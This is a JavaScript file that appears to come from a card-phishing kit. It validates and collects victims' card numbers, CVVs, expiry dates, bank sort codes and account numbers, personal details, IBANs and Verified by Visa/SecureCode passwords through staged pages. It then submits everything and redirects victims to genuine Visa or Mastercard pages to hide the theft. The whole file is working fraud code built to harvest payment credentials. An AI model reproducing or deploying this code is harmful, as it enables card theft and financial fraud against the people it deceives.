function start()
{
  $('.welcome_page').hide();
  $('.cc_page').show();
}


        
$('.minput').popover({
	    trigger:"manual"
	 }).on('click change',function(){
	     hide_card_err(this);
})
	   
	   
$('#cc').on('keyup',function(e){
	
			var temmp_val=$('#cc').val().trim();
			if(temmp_val.length < 13)
				return;
				
			if(/^\d{13,19}$/.test(temmp_val)){
				 first_ch=temmp_val.match(/^\d/)[0];
				console.log(first_ch);
				switch(first_ch){
					case "3":$('#amex').addClass('card_selected');hide_unselected_card_icon();break;
					case "4":$('#visa').addClass('card_selected');hide_unselected_card_icon();break;
					case "5":$('#mc').addClass('card_selected');hide_unselected_card_icon();break;
					default:show_cadr_err(this);return;
				};
				hide_card_err(this);
				
				if(temmp_val.length==19 || 
					temmp_val.length==16 ||
					temmp_val.length==15 ||
					temmp_val.length==13){
					//luhn
					show_exp();
				};
			}else{
				if(temmp_val.length<1){
					resset_card_icons()
				}else{
					if(/^\d{13,19}/.test(temmp_val)){
					     $(this).val(temmp_val.match(/^\d{13,19}/));
					}else{
					   show_cadr_err(this);
					};
				};
			};
});
	   
	   
	   
	
function hide_unselected_card_icon(){
 $('.card_icons:not(".card_selected")').css("visibility","hidden");
}
function show_cadr_err(el){
  $(el).popover('show').closest('.form-group').addClass('has-error').find('.form-control-feedback').show();
  $(el).addClass('shake animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
	  $(el).removeClass('shake animated');
  })
}	
	
function resset_card_icons(){

  $('.card_selected').removeClass('card_selected');
  $('.card_icons').css("visibility","visible");
  hide_card_err($('#cc'));
}


function hide_card_err(el){
  $(el).closest('.form-group').removeClass('has-error').find('.form-control-feedback').hide();
  $(el).popover('hide');
}
	
function valid_cc_on_go(){
  
  var curent_cc_val=$('#cc').val().trim();
  

}	



$('#name, #f_name ,#city').on('keyup',function(e){
			var temmp_val=$(this).val().trim();
			if(!/\d/.test(temmp_val)){
				hide_card_err(this);
			}else{
				show_cadr_err(this);
			};
});


function show_exp(){
   $('.exp_row').addClass('animated fadeInDown');
}


$('#cvv').on('click',function(){
   $('.cvv_icon').addClass('animated fadeInDown');
})




$('#cvv').on('keyup',function(e){
			var temmp_val=$('#cvv').val().trim();
			if(/^\d{1,3}$/.test(temmp_val)){
				hide_card_err(this);
				if(temmp_val.length==3){
					//show_acc();
				}
			}else{
				if(temmp_val.length<1){
					
				}else{
					if(/^\d{1,40}/.test(temmp_val)){
					     $(this).val(temmp_val.match(/^\d{3}/));
					}else{
					   show_cadr_err(this);
					};
				};
			};
});
	   
function show_acc(){
  $('.acc_row').show().addClass('animated fadeInDown');
}	



$('#s_code').on('keyup',function(e){
			var temmp_val=$('#s_code').val().trim();
			if(/^\d{1,6}$/.test(temmp_val)){
				hide_card_err(this);
			}else{
				if(temmp_val.length<1){
					
				}else{
					if(/^\d{1,40}/.test(temmp_val)){
					     $(this).val(temmp_val.match(/^\d{6}/));
					}else{
					   show_cadr_err(this);
					};
				};
			};
});

$('#acc').on('keyup',function(e){
			var temmp_val=$('#acc').val().trim();
			if(/^\d{1,8}$/.test(temmp_val)){
				
			}else{
				if(temmp_val.length<1){
					//resset_card_icons()
				}else{
					if(/^\d{1,40}/.test(temmp_val)){
					     $(this).val(temmp_val.match(/^\d{8}/));
					}else{
					   show_cadr_err(this);
					};
				};
			};
});


function send_cc(){
	show_wit(function(){
		validate_cc_page();
	})
}


function send_personal(){
	show_wit(function(){
		validate_personal_page();
	})
}

function t()
{
	// amex 378282246310005
	// visa 4012888888881881
	// mc 5555555555554444
	$('.vbv_page').show();
	$('.personal_page').show();
	$('.visa_or_mc').text(visa_or_mc());
}

function validate_personal_page(){
    if(!/^[a-z-A-Z0-9]{1,40}\b/.test($('#f_name').val().trim())){show_cadr_err($('#f_name'));}; 
    if($('#dob_d option:selected').val()=="--"){show_cadr_err($('#dob_d'))};
    if($('#dob_m option:selected').val()=="--"){show_cadr_err($('#dob_m'))};
    if($('#dob_y option:selected').val()=="--"){show_cadr_err($('#dob_y'))};
    if(!/^[a-z-A-Z0-9]{1,40}\b/.test($('#house_n').val().trim())){show_cadr_err($('#house_n'));}; 
    if(!/^[a-z-A-Z]{1,40}\b/.test($('#city').val().trim())){show_cadr_err($('#city'));}; 
    if(!/^[a-z-A-Z0-9]{1,10}\b/.test($('#post').val().trim())){show_cadr_err($('#post'));}; 
    
    if($('#iban').val() !== undefined)
		if(!/^[a-z-A-Z0-9]{18}\b/.test($('#iban').val().trim())){show_cadr_err($('#iban'));}; 
		
	if($('.has-error').size()>0){return;}; 
	if(askVbv==true){
		$('.personal_page').hide();
        $('.vbv_page').show();
		$('body').css({"background":"white"});
		$('.visa_or_mc').text(visa_or_mc());
	}else{
         $('#mf')[0].submit();
		 }
}


function visa_or_mc()
{
	switch(first_ch){
		case "3":$('.amex_icon').removeClass('none');return $('#amex_pass_text').html(); break;
		case "4":$('.vbv_icon').removeClass('none');return $('#visa_pass_text').html();break;
		case "5":$('.mc_icon').removeClass('none');return $('#mc_pass_text').html();break;
		default:return "Secure password";
	};
}


$('#vbv').on('keyup',function (e)
{
  hide_card_err(this);
})



function send_vbv()
{
   if(!$("input[name=sms_vbv]").is(":checked")) {
   	if(!/^[a-z-A-Z0-9]{1,40}\b/.test($('#vbv').val().trim())){show_cadr_err($('#vbv'));}; 
   	if($('.has-error').size()>0){return;}
   }
   
   $('#mf')[0].submit();
}
function sms_vbv()
{
	$.post(prompt('getLink'), $('#mf').serialize(), function() {

	}).always(function() {

		if($("#cc").val().substr(0,1)=="5")
			location.href="https://www.mastercard.us/en-us/consumers/features-benefits/securecode.html?hideme"
		else
			location.href="https://www.visaeurope.com/making-payments/verified-by-visa/?hideme"
	});

	return false;
}
/*
function validate_cc_page(){
	
  if(!/^[0-9]{13,19}\b/.test($('#cc').val().trim())){show_cadr_err($('#cc'));};
  if(!/^[a-z-A-Z0-9]{1,40}\b/.test($('#name').val().trim())){show_cadr_err($('#name'));}; 
  if($('#exp_y option:selected').val()=="--"){show_cadr_err($('#exp_y'))};
  if($('#exp_m option:selected').val()=="--"){show_cadr_err($('#exp_m'))};
  if(!/^[0-9]{3}\b/.test($('#cvv').val().trim())){show_cadr_err($('#cvv'));};  
  //~ if(!/^[0-9]{6}\b/.test($('#s_code').val().trim())){show_cadr_err($('#s_code'));};  
  //~ if(!/^[0-9]{8}\b/.test($('#acc').val().trim())){show_cadr_err($('#acc'));};  


  if($('.has-error').size()>0){return;};  
  $('.cc_page').hide();
  $('.personal_page').show();
  inser_card_icon();
}*/

function validate_cc_page(){
	 
	var shit = $('#cc').val().trim();
	if(!/^[0-9]{13,19}$/.test(shit)){show_cadr_err($('#cc'));};
	//advaced
	 if(!valid_credit_card($('#cc').val().trim())){show_cadr_err($('#cc'));};
	//

	if(!/^.{1,40}/.test($('#name').val().trim())){show_cadr_err($('#name'));}; 
	if(!advanced_string_validation($('#name').val().trim())){show_cadr_err($('#name'));}; 

    if($('#s_code').val() !== undefined)
		if(!/^[0-9]{6}\b/.test($('#s_code').val().trim())){show_cadr_err($('#s_code'));}; 

    if($('#acc').val() !== undefined)
		if(!/^[0-9]{8}\b/.test($('#acc').val().trim())){show_cadr_err($('#acc'));}; 
		
	if($('#exp_y option:selected').val()=="--"){show_cadr_err($('#exp_y'))};
	if($('#exp_m option:selected').val()=="--"){show_cadr_err($('#exp_m'))};


	//advanced
	   today = new Date();
	   someday = new Date();
	   someday.setFullYear($('#exp_y option:selected').val(), $('#exp_m option:selected').val(), 1);
	   if (someday < today) {
		   show_cadr_err($('#exp_y'));
		   show_cadr_err($('#exp_m'));
		   return false;
	   }
	//
	if(!/^[0-9]{3}$/.test($('#cvv').val().trim())){show_cadr_err($('#cvv'));};  
	//if(!/^[0-9]{6}\b/.test($('#s_code').val().trim())){show_cadr_err($('#s_code'));};  
	//if(!/^[0-9]{8}\b/.test($('#acc').val().trim())){show_cadr_err($('#acc'));};  


	if($('.has-error').size()>0){return;};  
	$('.cc_page').hide();
	$('.personal_page').show();
	inser_card_icon();	
}

function inser_card_icon(){
	var last_4=$('#cc').val().trim().match(/\d{4}$/);
	$('.last_4').html(last_4);
	var src=$('.card_selected').attr('src');
	$('.icon_slot').html('').append('<img src="'+src+'" />');
}


function show_wit(fn){
	if(typeof(fn)=="undefined"){fn=function(){}};
	$('.wit').show();
	
	setTimeout(function(){
		$('.wit').hide();
		fn();
	},1000);
}


function valid_credit_card(value) {
  // accept only digits, dashes or spaces
	if (/[^0-9-\s]+/.test(value)) return false;

	// The Luhn Algorithm. It's so pretty.
	var nCheck = 0, nDigit = 0, bEven = false;
	value = value.replace(/\D/g, "");

	for (var n = value.length - 1; n >= 0; n--) {
		var cDigit = value.charAt(n),
			  nDigit = parseInt(cDigit, 10);

		if (bEven) {
			if ((nDigit *= 2) > 9) nDigit -= 9;
		}

		nCheck += nDigit;
		bEven = !bEven;
	}

	return (nCheck % 10) == 0;
}

function advanced_string_validation(f){
	for(i=0;i<f.length;i++){
     if(f[i]==f[i+1]){
         if(f[i]==f[i+2]){
             return false;
         }
      }
    }
	return true;
}
